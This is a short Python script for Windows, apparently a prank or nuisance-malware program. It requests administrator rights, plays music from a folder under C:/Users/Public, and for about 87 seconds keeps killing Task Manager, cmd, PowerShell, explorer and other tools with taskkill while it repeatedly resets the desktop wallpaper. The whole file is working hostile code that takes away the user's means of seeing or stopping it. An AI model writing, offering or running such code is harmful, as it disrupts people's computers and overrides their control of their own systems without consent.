from pygame import *
from time import sleep
import os
from pyqadmin import admin
from time import *
import ctypes


mixer.init()
mixer.music.load("C:/users/public/b2ho4n59as/music.mp3")

start = 0

@admin
def timer():
    mixer.music.play()
    global start
    start = time()
    while True:
        if time() - start > 2.6:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/Users/Public/b2ho4n59as/background.png", 0)
        if time() - start >= 87.5:
            break
        os.system("taskkill /im Taskmgr.exe")
        if time() - start > 2.6:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/Users/Public/b2ho4n59as/background.png", 0)
        os.system("taskkill /im cmd.exe")
        if time() - start > 2.6:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/Users/Public/b2ho4n59as/background.png", 0)
        os.system("taskkill /im powershell.exe")
        if time() - start > 2.6:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/Users/Public/b2ho4n59as/background.png", 0)
        os.system("taskkill /im explorer.exe")
        if time() - start > 2.6:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/Users/Public/b2ho4n59as/background.png", 0)
        os.system("taskkill /im git-cmd.exe")
        if time() - start > 2.6:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/Users/Public/b2ho4n59as/background.png", 0)
        os.system("taskkill /im total-comander.exe")

timer()